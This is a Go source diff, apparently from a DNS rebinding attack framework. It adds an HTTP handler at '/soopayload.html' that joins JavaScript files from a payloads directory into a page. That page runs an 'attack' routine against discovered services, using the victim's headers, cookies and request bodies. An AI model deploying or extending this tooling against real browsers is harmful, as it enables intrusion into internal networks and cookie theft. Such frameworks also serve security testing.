@@ -6,11 +6,14 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"html/template"
 	"io/ioutil"
 	"log"
 	"math/rand"
 	"net"
 	"net/http"
+	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"sync"
@@ -367,6 +370,14 @@ type HTTPClientInfoHandler struct {
 	Port      string
 }
 
+// PayloadTemplateHandler is a HTTP handler to deliver payloads to HTTP clients
+type PayloadTemplateHandler struct {
+}
+
+type templatePayloadData struct {
+	JavaScriptCode template.JS
+}
+
 // HTTPServerStoreHandler holds the list of HTTP servers
 // Many servers at startup and one (1) dynamically instantianted server
 // Access to the servers list must be performed via mutex
@@ -429,6 +440,54 @@ func (hcih *HTTPClientInfoHandler) ServeHTTP(w http.ResponseWriter, r *http.Requ
 		http.Error(w, string(emptyResponse), 400)
 		return
 	}
+}
+
+func concatenateJS(dirPath string) []byte {
+	var js_code []byte
+	// walk all files in directory
+	filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
+		if !info.IsDir() && strings.HasSuffix(info.Name(), ".js") {
+			println("concatenating " + path + " ...")
+			b, err := ioutil.ReadFile(path)
+			if err != nil {
+				return err
+			}
+			js_code = append(js_code, b...)
+		}
+		return nil
+	})
+	return js_code
+}
+
+// HTTP Handler for "/soopayload.html"
+func (pth *PayloadTemplateHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
+	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)
+
+	const tpl = `<!doctype html>
+	<html><head><title>TKTK</title><script src="payload.js"></script>
+	<script>
+	{{ .JavaScriptCode }}
+	function attack(headers, cookie, body) {
+	for (const p of Registry) {
+		if (p.isService() === true)
+		p.attack(headers, cookie, body);
+	};
+	}
+	</script></head>
+	<body onload="begin('/')")><h3>TKTK</h3>
+	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
+	</body></html>`
+
+	check := func(err error) {
+		if err != nil {
+			log.Fatal(err)
+		}
+	}
+	t, err := template.New("webpage").Parse(tpl)
+	check(err)
+	templateData := templatePayloadData{JavaScriptCode: template.JS(concatenateJS("html/payloads"))}
+	err = t.Execute(w, templateData)
+	check(err)
 }
 
 // HTTP Handler for /servers
@@ -607,6 +666,8 @@ func NewHTTPServer(port int, hss *HTTPServerStoreHandler, dcss *DNSClientStateSt
 	wscss *WebsocketClientStateStore) *http.Server {
 	d := &DefaultHeadersHandler{NextHandler: http.FileServer(http.Dir("./html"))}
 	hcih := &HTTPClientInfoHandler{}
+	pth := &PayloadTemplateHandler{}
+	dpth := &DefaultHeadersHandler{NextHandler: pth}
 	ipth := &IPTablesHandler{}
 	delayDOMLoadHandler := &DelayDOMLoadHandler{}
 	websocketHandler := &WebsocketHandler{dcss: dcss, wscss: wscss}
@@ -649,11 +710,10 @@ func NewHTTPServer(port int, hss *HTTPServerStoreHandler, dcss *DNSClientStateSt
 	})
 
 	h.Handle("/clientinfo", hcih)
+	h.Handle("/soopayload.html", dpth)
 	h.Handle("/servers", hss)
 	h.Handle("/delaydomload", delayDOMLoadHandler)
-	//h.Handle("/sooproxy/", proxyHandler)
 	h.Handle("/soows", websocketHandler)
-	//h.Handle("/soohooked", hookedClientAuthHander)
 
 	httpServer := &http.Server{Addr: ":" + strconv.Itoa(port), Handler: h}
 
